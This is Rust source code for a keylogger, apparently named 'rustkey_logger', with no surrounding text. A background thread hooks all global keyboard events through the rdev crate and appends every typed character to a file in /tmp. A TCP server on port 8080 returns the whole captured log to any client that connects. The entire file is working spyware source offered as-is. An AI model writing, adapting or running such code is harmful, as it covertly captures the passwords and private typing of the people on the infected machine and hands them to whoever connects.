use dotenv::dotenv;
use std::env;
use std::fs::OpenOptions;
use std::io::prelude::*;
use rdev::{listen, Event};
use std::fs::File;
use std::net::{TcpListener, TcpStream};

pub fn main() {
    dotenv().ok();
    let _server_port = env::var("SERVER_PORT");

    let _file = match File::create("/tmp/rustkey_logger.log") {
        Ok(file) => file,
        Err(e) => panic!("Failed to create file: {}", e),
    };

    std::thread::spawn( || { keylogger() });

    let listener = TcpListener::bind("127.0.0.1:8080").expect("Failed to bind to port");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                std::thread::spawn(move || {
                    handle_client(stream);
                });
            }
            Err(e) => {
                println!("Error: {}", e);
            }
        }
    }

    fn handle_client(mut stream: TcpStream) {
        println!("Client connected: {:?}", stream.peer_addr().unwrap());
        
        // Read data from the client
        let mut buffer = [0; 1024];
        stream.read(&mut buffer).expect("Failed to read from stream");
        
        println!("Received data: {}", String::from_utf8_lossy(&buffer));
        
        let mut file = File::open("/tmp/rustkey_logger.log").expect("Failed to open file");
        let mut contents = String::new();
        file.read_to_string(&mut contents).expect("Failed to read file");
        println!("{}", contents);
        stream.write(contents.as_bytes()).expect("Failed to write to stream");
        
        // Close the connection
        stream.flush().unwrap();
    }
}

fn keylogger() {
    if let Err(error) = listen(callback) {
        println!("Error: {:?}", error)
    }

    fn callback(event: Event) {
        // println!("My callback {:?}", event);
        let mut file = match OpenOptions::new().append(true).open("/tmp/rustkey_logger.log") {
            Ok(file) => file,
            Err(e) => panic!("Failed to create file: {}", e),
        };

        match event.name {
            Some(string) => {
                if string == '\r'.to_string() {
                    match file.write_all('\n'.to_string().as_bytes()) {
                        Ok(_) => (),
                        Err(e) => panic!("Failed to write to file: {}", e),
                    }
                }
                else {
                    match file.write_all(string.to_string().as_bytes()) {
                        Ok(_) => (),
                        Err(e) => panic!("Failed to write to file: {}", e),
                    }
                }
                // println!("User wrote {:?}", string)
            },
            None => (),
        }
    }
}